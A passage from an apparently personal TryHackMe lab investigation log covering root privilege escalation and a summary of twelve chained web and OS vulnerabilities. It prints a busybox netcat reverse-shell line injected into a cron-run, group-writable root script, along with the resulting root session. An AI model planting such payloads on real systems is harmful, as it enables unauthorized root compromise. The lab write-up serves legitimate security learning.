Access was via `su` from the existing web-shell foothold, not a direct SSH login; whether this credential also works over actual SSH (port 22, open since initial recon) was never tested.

#### Next Steps

Enumerate for privilege escalation to `root`.

### Phase 11: Privilege Escalation — From a Fully Mapped Path to Root

#### Objective

Escalate from `devops` to `root`.

#### Observations

`pspy64` surfaced a persistent root-owned Python process:

```
2026/10/29 14:58:20 CMD: UID=0  PID=1107  | /usr/bin/python3 /opt/admin_bot.py
```

`/opt/admin_bot.py` (the same SSRF script from Phase 9), managed by a systemd unit:

```bash
devops@tryhackme-2404:/opt$ ls -la admin_bot.py
-rwxrwxrwx 1 root root 1870 May  7 20:26 admin_bot.py
```
```bash
devops@tryhackme-2404:/opt$ cat /etc/systemd/system/admin-bot.service
[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/admin_bot.py
Restart=always
RestartSec=10
```

World-writable (`rwxrwxrwx`), run as root, with `Restart=always`.

#### Hypotheses

A world-writable, root-executed, auto-restarting script is a complete privilege-escalation primitive if a restart trigger can be found that `devops` can invoke.

#### Actions and Experiments

Systematic enumeration of possible restart triggers:

```bash
echo 'D3v0ps!2024' | sudo -S -l
```
```bash
find / -perm -4000 -type f 2>/dev/null
```
```bash
ls -la /etc/cron.hourly/ /etc/cron.daily/
cat /etc/cron.hourly/*
```
```bash
cat /etc/logrotate.d/* | grep -i 'admin\|nexus\|restart'
```
```bash
systemctl restart admin-bot.service
```

Also checked the second write primitive found along the way:

```bash
ls -la /opt/monitoring/health_report.sh
```

#### Results

| Avenue checked | Result |
| --- | --- |
| `sudo -l` | **Denied** — `"user devops may not run sudo on tryhackme-2404"` |
| SUID binaries | Only stock `/snap/core*/...` binaries — nothing custom |
| `cron.hourly`/`cron.daily` | `cron.hourly` empty (placeholder only); `cron.daily` only stock package entries |
| `logrotate.d` | Only the stock MySQL entry matched — no custom `postrotate` restart hook |
| Direct service restart | **Denied**, but informative: PolicyKit prompted `Authenticating as: Ubuntu (ubuntu)`, scoped to the `ubuntu` account specifically, not `devops` |
| `health_report.sh` permissions | `-rwxrwxr-- 1 root devops 537 ...` — writable by the `devops` group, no confirmed execution trigger yet |

No restart trigger for `admin-bot.service` was ever found — this avenue was left genuinely unresolved (see Section 7). As a speculative attempt, a reverse-shell payload was appended to `health_report.sh` at the end of a prior session, reasoning that root ownership implied *some* execution path even though none was confirmed yet. The script's original content, read before editing it:

```bash
devops@tryhackme-2404:/opt$ cat monitoring/health_report.sh
#!/bin/bash
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
```

A legitimate, unremarkable monitoring script — it checks whether `apache2`/`mysql` are active and logs disk usage; nothing in its own logic mattered. What mattered was that `root` executes it and the `devops` group can write to it, so the reverse-shell payload was appended at the top:

```bash
devops@tryhackme-2404:/opt/monitoring$ cat health_report.sh
#!/bin/bash
# Reverse shell
busybox nc 10.49.120.226 4445 -e sh
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
```

No callback was observed before that first session ended, so the edit stayed a parked, unverified action rather than a confirmed working step. Picking the investigation back up in a later session, we re-ran `pspy64` to see whether anything had actually touched the file. Unlike the first dump (every line sharing one identical startup timestamp), this run showed `health_report.sh` executing as `UID=0` on a genuine 60-second cadence:

```bash
2026/10/30 13:23:01 CMD: UID=0     PID=1737   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1742   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1741   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1740   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1749   | systemctl is-active --quiet apache2
2026/10/30 13:24:01 CMD: UID=0     PID=1747   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1750   | systemctl is-active --quiet mysql
2026/10/30 13:24:01 CMD: UID=0     PID=1752   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1751   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1753   | /bin/bash /opt/monitoring/health_report.sh
```

(The earlier startup-only snapshot that first surfaced `admin_bot.py` is the full dump saved in [`evidence/pspy64-startup-dump.txt`](evidence/pspy64-startup-dump.txt), referenced from Phase 10.)

Two timestamps 60 seconds apart, not a single startup artifact — only achievable by a `* * * * *`-style cron entry. Tracked the schedule's location down:

```bash
devops@tryhackme-2404:/opt/tools$ cat /etc/crontab
...
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
```bash
devops@tryhackme-2404:/opt/tools$ ls -la /var/spool/cron/crontabs
ls: cannot open directory '/var/spool/cron/crontabs': Permission denied
devops@tryhackme-2404:/opt/tools$ cat /var/spool/cron/crontabs/root 2>/dev/null
```
```bash
devops@tryhackme-2404:/opt/tools$ ls -la /etc/cron.d/
total 32
drwxr-xr-x   2 root root  4096 Apr 29  2026 .
drwxr-xr-x 114 root root 12288 Oct 30 13:02 ..
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root   201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root   712 Jan 19  2024 php
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
devops@tryhackme-2404:/opt/tools$ cat /etc/cron.d/*
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1
59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
```

`/etc/crontab` and `/etc/cron.d/` both ruled out (only stock entries); `/var/spool/cron/crontabs/` denied access outright on both a directory listing and a direct file read. This pointed to the job being defined in root's own personal crontab, a location correctly inaccessible to `devops` even though the target script itself is group-writable to that same user. The timing evidence alone was sufficient confirmation without needing to read that file.

With the payload already in place from the earlier session, the next 60-second tick fired it:

```bash
└─# python3 penelope.py -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 -> 127.0.0.1 • 10.49.120.226
[+] [New Reverse Shell] => tryhackme-2404 10.49.179.121 Linux-x86_64 👤 root(0) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
root@tryhackme-2404:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:~# whoami
root
root@tryhackme-2404:~# pwd
/root
root@tryhackme-2404:~# ls
root.txt  snap
root@tryhackme-2404:~# cat root.txt
THM{[REDACTED]}
```

**Flag captured** from `/root/root.txt` (redacted), identity confirmed three separate ways (`id`, `whoami`, `pwd`).

#### Analysis

Two independent root-owned write primitives existed on the same host (`admin_bot.py` / world-writable + `Restart=always`, and `health_report.sh` / group-writable + cron-triggered). Only the second was ever confirmed to have a working, accessible execution trigger. The key reasoning step was treating a `Permission denied` on `/var/spool/cron/crontabs/` as *confirming* evidence (a personal root crontab exists and is correctly locked down) rather than a dead end, once the world-readable schedule locations had already been ruled out.

#### Failed Attempts / Dead Ends

The `admin_bot.py` / `admin-bot.service` avenue: fully mapped as a write primitive, but no restart trigger was ever found despite enumerating `sudo`, SUID, cron, logrotate, and a direct restart attempt. Left open rather than abandoned — see Section 7.

#### Findings

Confirmed: world-writable root-owned automation script (CWE-732), privilege escalation not completed via this avenue. Confirmed: cron-triggered group-writable script → full root compromise (CWE-732), the avenue that actually worked.

#### Evidence

`health_report.sh` contents, both `pspy64` runs, the crontab-location enumeration, and the final root-shell transcript are captured inline above (this phase). Full startup process dump: [`evidence/pspy64-startup-dump.txt`](evidence/pspy64-startup-dump.txt).

![Post-exploitation root shell](evidence/images/root-shell.png)

*(Note: this screenshot was not referenced in either original draft; it was not used in `writeups/TryHackMe/domino.md` either. It likely shows the flag in-frame and should be treated the same way as `admin-profile.png` if ever pulled into a writeup.)*

#### Remaining Questions

See Section 7 (`admin_bot.py` restart trigger, `getcap` sweep, PolicyKit rules never read).

#### Next Steps

None — room completed.

## 5. Vulnerability Candidates

All candidates reached "Confirmed" status by the end of the investigation; see Section 6 for the full writeup-ready detail. The `admin_bot.py`/`admin-bot.service` write primitive (Phase 11) is tracked separately in Section 7 as an unresolved avenue rather than a candidate, since it was fully characterized but never completed to impact.

## 6. Confirmed Vulnerabilities

1. **Username Enumeration** (CWE-203) — `/forgot.php` response differs by account existence. Low impact alone; the seed for everything else.
2. **Password Reuse / Weak Shared Credential** (CWE-521) — 3 of 7 accounts shared the password `password`. Gave the first authenticated foothold.
3. **JWT Signature Verification Disabled** (CWE-347) — `verify_jwt()`'s signature check is commented out; any authenticated user can mint an admin-role JWT.
4. **Local File Inclusion / Path Traversal** (CWE-22, partially mitigated) — containment check normalizes paths correctly against `../` traversal, but doesn't account for the API's own directory depth, letting a single `../` disclose source one level up.
5. **Hardcoded Secrets in Source** (CWE-798) — `DB_PASS`, `JWT_SECRET`, `APP_SECRET` all hardcoded in `config.php`, disclosed via Finding 4.
6. **Session Cookie Forgery → Full Administrative Impersonation** (CWE-290) — `APP_SECRET` leak lets an attacker forge a valid `nexus_session` cookie for any `user_id`, including the CISO.
7. **IDOR — Horizontal Privilege Escalation** (CWE-639) — `/api/users/profile.php?id=` has no ownership/role check; independent of Findings 3–6.
8. **Remote File Inclusion → Remote Code Execution** (CWE-98) — the same `name=` parameter from Finding 4 fetches and executes a remote URL, not just local files.
9. **SSRF via Ticket-Review Automation** (CWE-918) — `admin_bot.py` regexes ticket content for URLs and issues an authenticated-as-admin, root-run `requests.get()` against them.
10. **Credential Reuse — DB Password as OS Password** (CWE-521) — `DB_PASS` from Finding 5 is also the `devops` OS account's password.
11. **World-Writable Root-Owned Automation Script** (CWE-732) — `admin_bot.py` is `rwxrwxrwx`, executed by a `Restart=always` systemd service as root; restart trigger never found, so impact was never realized.
12. **Cron-Triggered Group-Writable Script → Full Root Compromise** (CWE-732) — `health_report.sh` is group-writable to `devops`'s group and executed every 60 seconds by a job in root's personal crontab; this is the primitive that actually delivered root.

Full reproduction detail, request/response transcripts, and source excerpts for each: see the matching phase in Section 4 (Investigation Log) above.

## 7. Rabbit Holes and Disproven Hypotheses

- **"Blind XSS" against ticket review (Phase 9):** reasoned that an "admin reviews tickets" feature plus unsanitized message storage implied a headless-browser XSS reachable target. Both cookie-exfiltration and authenticated-fetch-exfiltration payloads returned empty results consistently. Disproven once OS access revealed `admin_bot.py` is a plain regex-and-`requests.get()` script with no browser or JS execution at all — the real vulnerability class is SSRF, not XSS. Lesson: a request landing on your listener confirms *something* is processing input server-side; it does not confirm *how*, and a payload that "mostly works" (fires, but returns nothing useful) is a signal to find the actual server-side code rather than iterate on payload variants.
- **`admin_bot.py`/`admin-bot.service` restart trigger:** fully mapped as a world-writable, root-executed, auto-restarting script, which is a textbook privesc primitive in theory. Exhausted `sudo -l`, SUID binaries, `cron.hourly`/`cron.daily`, `logrotate.d`, and a direct `systemctl restart` attempt (denied, PolicyKit-scoped to `ubuntu`, not `devops`) without finding an accessible trigger. Never disproven outright, left genuinely open — unlike the XSS hypothesis, this wasn't wrong, just unresolved when a different primitive (`health_report.sh`) was found and worked first. `getcap -r /` and the PolicyKit rule files were identified as the next steps but never executed.

## 8. Evidence and Artifacts

| ID    | Description                                              | Location                                                                     | Related Finding |
|-------|-----------------------------------------------------------|-------------------------------------------------------------------------------|------------------|
| E-001 | Full command/output transcript for all phases — captured inline per phase, no separate session-notes file | `investigations/TryHackMe/domino/investigation.md` (Phases 1-11) | All phases |
| E-002 | Full `pspy64` startup process dump (startup-only snapshot, every entry sharing one timestamp) | `investigations/TryHackMe/domino/evidence/pspy64-startup-dump.txt` | Phases 10, 11 |
| E-003 | Login page screenshot                                      | `investigations/TryHackMe/domino/evidence/images/login.png`                            | Phase 1 |
| E-004 | "Our Team" page screenshot                                 | `investigations/TryHackMe/domino/evidence/images/our-team-page.png`                    | Phase 1 |
| E-005 | Dashboard screenshot (emma.taylor)                          | `investigations/TryHackMe/domino/evidence/images/emma-taylor-dashboard.png`            | Phase 3 |
| E-006 | Support tickets page screenshot                             | `investigations/TryHackMe/domino/evidence/images/support-tickets.png`                  | Phase 3 |
| E-007 | Open ticket page screenshot                                 | `investigations/TryHackMe/domino/evidence/images/open-ticket.png`                      | Phase 3 |
| E-008 | Forged-cookie admin dashboard screenshot                     | `investigations/TryHackMe/domino/evidence/images/admin-dashboard.png`                  | Phase 6 |
| E-009 | Admin console screenshot                                    | `investigations/TryHackMe/domino/evidence/images/admin-console.png`                    | Phase 6 |
| E-010 | IDOR profile-disclosure screenshot — **shows flag 1 in-frame, unredacted** | `investigations/TryHackMe/domino/evidence/images/admin-profile.png` | Phase 7 |
| E-011 | XSS/SSRF test screenshot                                    | `investigations/TryHackMe/domino/evidence/images/xss-test.png`                         | Phase 9 |
| E-012 | Attacker HTTP server screenshot                             | `investigations/TryHackMe/domino/evidence/images/http-server.png`                      | Phase 8 |
| E-013 | Reverse-shell listener/server setup screenshot               | `investigations/TryHackMe/domino/evidence/images/reverse-shell-setup.png`              | Phase 8 |
| E-014 | Root shell screenshot — **likely shows flag 5 in-frame, unredacted** | `investigations/TryHackMe/domino/evidence/images/root-shell.png`             | Phase 11 |
| E-015 | Disclosed PHP source files (`index.php`, `auth.php`, `config.php`, `dashboard.php`, `forgot.php`, `admin.index.php`, `support.create.php`, `support.index.php`) | `investigations/TryHackMe/domino/evidence/sources/` | Phases 5, 6, 9 |
| E-016 | `admin_bot.py` (SSRF automation source)                      | `investigations/TryHackMe/domino/evidence/sources/admin-bot.py`                        | Phase 9, 11 |
| E-017 | `generate-cookie.py` (session-forgery helper script, written by us, not disclosed by the target) | `investigations/TryHackMe/domino/evidence/scripts/generate-cookie.py` | Phase 6 |

## 9. Technical Knowledge and Lessons Learned

### Concepts

- JWT "verification" that only checks expiry, not signature, is equivalent to no authentication on the claims at all — the `role` claim becomes fully attacker-controlled.
- A path-containment check correct for local traversal (`realpath()`-style normalization) does not generalize to a remote URL, which can't be resolved the same way.
- Two independently-discovered root-owned write primitives on one host (a `Restart=always` service and a cron job) are both instances of the same misconfiguration class: a non-root-writable path reaching root-level execution. Permissions and execution triggers need auditing together, not separately.

### Techniques

- Decoding a JWT locally (base64url, no secret needed) to read its claims before touching the signature at all — cheap, non-destructive, and often enough to form a testable hypothesis.
- Using a known in-bounds file read to fingerprint the actual working directory implied by an LFI's error message, rather than trusting the error message's stated base path literally.
- Differentiating "fetched and displayed" from "fetched and executed" with an arithmetic payload (`1337*2`) before moving to a differentiating `system()` call — confirms RCE in stages rather than jumping straight to a reverse shell.
- Treating a `Permission denied` on a specific, expected location (`/var/spool/cron/crontabs/`) as positive evidence that a personal crontab exists there, once the world-readable alternatives are already ruled out.

### Lessons

- A request landing on an attacker-controlled listener is necessary but not sufficient evidence for a specific vulnerability class (Phase 9's XSS misdiagnosis) — confirm the actual server-side mechanism before committing to a technique.
- An unresolved hypothesis (the `admin_bot.py` restart trigger) is not a failure if it's recorded as unresolved rather than abandoned silently; a second host-level primitive can and did resolve the engagement without it.

### Future Applications

Apply the "confirm the server-side mechanism, not just that a payload fires" lesson to any future blind-injection-style finding before writing a root-cause explanation. Apply the "audit permissions and execution triggers together" lesson as a standing step whenever a writable, privileged file is found during post-exploitation.

## 10. Final Investigation Summary

### Investigation Outcome

Full compromise, zero credentials to root, via a chained set of independently minor web-app issues plus a second, separate OS-level misconfiguration for privilege escalation.

### Confirmed Vulnerabilities

Twelve findings; see Section 6.

### Unsuccessful Investigations

The initial "blind XSS" hypothesis for the ticket-review feature (Phase 9, disproven — real root cause is SSRF). The `admin_bot.py`/`admin-bot.service` restart-trigger search (Phase 11, unresolved, not disproven).

### Unresolved Issues

See Section 2 (Open Questions) and Section 7.

### Final Status

Completed. `user.txt` and `root.txt` both obtained (plus flags 1-3 along the way); flags redacted in this file per workflow policy, captured verbatim where obtained in Section 4's phases and in two screenshots noted in Section 8.

## 11. Writeup Handoff

- Investigation File: `investigations/TryHackMe/domino/investigation.md`
- Final Writeup: `writeups/TryHackMe/domino.md`
- Writeup Status: Generated from the engagement's raw session notes (since superseded by this investigation file, which now holds the full command/output record directly — see Section 8, E-001), with flags redacted and image paths updated to point at `investigations/TryHackMe/domino/evidence/images/`.
- Important Narrative Events: The IDOR finding (Phase 7) being independent of the admin-impersonation chain; the flag-2 capture from `admin/index.php`'s source (Phase 6); the Phase 9 XSS-to-SSRF correction; the Phase 11 two-primitive privilege-escalation story (one fully mapped but never completed, one that worked).
- Evidence References: See Section 8. Two images (`admin-profile.png`, `root-shell.png`) show flag text in-frame and are flagged accordingly wherever referenced.
- Special Instructions: The engagement's two raw-notes drafts (one narrative-styled, one CWE-structured vulnerability-report style) were fully merged into this investigation file's phases and the dedicated `pspy64-startup-dump.txt` evidence file, then removed; nothing from either draft was lost in the process.
